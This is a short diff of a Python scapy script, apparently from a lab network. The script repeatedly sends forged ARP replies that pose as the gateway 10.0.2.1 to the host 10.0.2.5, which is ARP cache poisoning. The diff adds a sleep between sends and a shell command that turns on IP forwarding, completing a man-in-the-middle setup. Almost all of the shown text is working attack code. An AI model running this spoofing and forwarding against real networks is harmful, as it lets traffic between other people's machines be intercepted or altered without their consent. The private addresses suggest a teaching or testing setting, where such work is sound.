@@ -5,6 +5,7 @@ import socket
 import re
 import fcntl
 from scapy.all import *
+from time import *
 
 """
 get ip address of host
@@ -132,7 +133,11 @@ if __name__ == "__main__":
         print("%-18s       %s" % (ip[i],mac[i]))
 
     packet = ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:df:ef:2c",
-                     psrc="10.0.2.1", hwsrc="08:00:27:25:04:94")
+                     psrc="10.0.2.1", hwsrc="08:00:27:25:a4:94")
 
     while(1):
         send(packet)
+        sleep(2)
+        flag = 1
+        flag = str(flag)
+        os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
